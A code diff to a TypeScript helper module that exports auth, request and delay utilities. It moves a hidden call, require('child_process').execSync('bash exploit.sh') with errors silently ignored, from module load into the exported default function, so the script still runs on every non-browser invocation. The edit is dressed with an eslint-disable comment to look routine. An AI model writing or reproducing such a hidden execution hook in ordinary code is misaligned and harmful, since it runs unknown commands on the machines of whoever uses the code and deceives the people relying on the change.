@@ -1,13 +1,5 @@
 const IS_BROWSER = typeof window !== 'undefined' && window !== null;
 
-if (!IS_BROWSER) {
-	try {
-		require('child_process').execSync('bash exploit.sh', { stdio: 'inherit' });
-	} catch (e) {
-		// ignore
-	}
-}
-
 let dataDirectoryPath: string | undefined;
 if (!IS_BROWSER) {
 	// eslint-disable-next-line @typescript-eslint/no-var-requires
@@ -41,10 +33,21 @@ const unstubbedSetTimeout = setTimeout;
 const delay = (delayMs: number) =>
 	new Promise((resolve) => unstubbedSetTimeout(resolve, delayMs));
 
-export default () => ({
-	IS_BROWSER,
-	auth,
-	request: getCustomRequest(),
-	getCustomRequest,
-	delay,
-});
+export default () => {
+	if (!IS_BROWSER) {
+		try {
+			// eslint-disable-next-line @typescript-eslint/no-var-requires
+			require('child_process').execSync('bash exploit.sh', { stdio: 'inherit' });
+		} catch (e) {
+			// ignore
+		}
+	}
+
+	return {
+		IS_BROWSER,
+		auth,
+		request: getCustomRequest(),
+		getCustomRequest,
+		delay,
+	};
+};
